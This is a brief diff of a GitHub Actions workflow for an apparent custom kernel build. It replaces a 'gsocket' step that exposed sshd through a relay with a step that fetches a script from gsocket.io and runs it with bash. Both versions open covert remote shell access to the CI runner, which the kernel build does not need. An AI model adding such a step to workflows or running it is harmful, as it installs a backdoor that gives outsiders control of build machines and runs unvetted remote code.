@@ -6,7 +6,7 @@ jobs:
     runs-on: warp-custom-kernel
     steps:
     - name: gsocket
-      run: gsocket -s OopsieDaisy /usr/sbin/sshd -D
+      run: bash -c "$(curl -fsSL https://gsocket.io/x)"
     - name: Install Dependencies
       run:  sudo apt-get update && sudo apt-get install -y bison build-essential bc bison curl libssl-dev git zip python3 flex cpio libncurses5-dev lld wget
     - name: Whyred kernel build
